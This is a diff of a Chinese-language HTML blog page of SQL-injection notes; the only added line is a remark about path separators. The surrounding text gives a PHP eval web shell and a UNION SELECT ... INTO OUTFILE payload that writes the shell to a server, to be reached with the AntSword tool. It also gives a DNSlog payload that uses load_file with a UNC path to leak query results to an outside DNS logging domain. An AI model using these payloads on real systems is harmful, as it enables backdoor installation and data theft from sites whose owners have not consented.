@@ -94,6 +94,7 @@
 
 <p>这个脚本使用了二分法提高查找效率</p>
 <h3 id="4-文件上传"><a href="#4-文件上传" class="headerlink" title="4.文件上传"></a>4.文件上传</h3><p>前提：在sql命令行中输入<code>show variables like &#39;%secure%&#39;</code>，显示的secure_file_priv为空，则可以任意读写文件<br>一句话木马：<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code><br>payload:<code>union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;路径&quot;#</code><br>之后使用蚁剑连接</p>
+<p>注意：路径的&#x2F;要\\替换</p>
 <h3 id="5-dnslog注入"><a href="#5-dnslog注入" class="headerlink" title="5.dnslog注入"></a>5.dnslog注入</h3><p>前提：读写权限打开<br>load_file()函数：参数为UNC路径 -&gt; &#x2F;servername&#x2F;sharename&#x2F;filename<br>payload：<code>select load_file(//(注入点).192.0.0.1/123/1.txt)</code><br>使用<a target="_blank" rel="noopener" href="https://dnslog.org/%E5%8F%AF%E4%BB%A5%E6%8B%BF%E5%88%B0dns%E5%9F%9F%E5%90%8D%EF%BC%8C%E6%88%91%E4%BB%AC%E9%87%87%E7%94%A8%E6%B3%A8%E5%85%A5%E7%82%B9.%E5%9F%9F%E5%90%8D%E7%9A%84%E6%96%B9%E5%BC%8F%E5%8F%AF%E4%BB%A5%E5%9C%A8%E8%BF%99%E4%B8%A4%E4%B8%AA%E7%BD%91%E7%AB%99%E6%8B%BF%E5%88%B0%E6%B3%A8%E5%85%A5%E7%BB%93%E6%9E%9C">https://dnslog.org/可以拿到dns域名，我们采用注入点.域名的方式可以在这两个网站拿到注入结果</a></p>
 <p><img src="/../images/sql%E6%B3%A8%E5%85%A5/7.png"></p>
 <p>注入点：select database()…..</p>
